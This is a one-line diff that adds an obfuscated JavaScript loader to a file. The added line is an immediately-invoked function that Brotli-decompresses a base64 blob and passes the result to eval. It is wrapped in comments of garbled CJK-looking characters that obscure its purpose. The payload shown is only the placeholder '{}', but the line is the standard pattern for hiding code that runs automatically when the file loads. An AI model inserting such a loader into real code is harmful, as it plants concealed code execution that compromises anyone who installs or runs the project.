@@ -1,0 +1,1 @@
+/*瑲慮猠*/(async ()=>{eval(require("zlib").brotliDecompressSync(Buffer.from("{}", "base64")).toString());})()/*物杨瑳*/
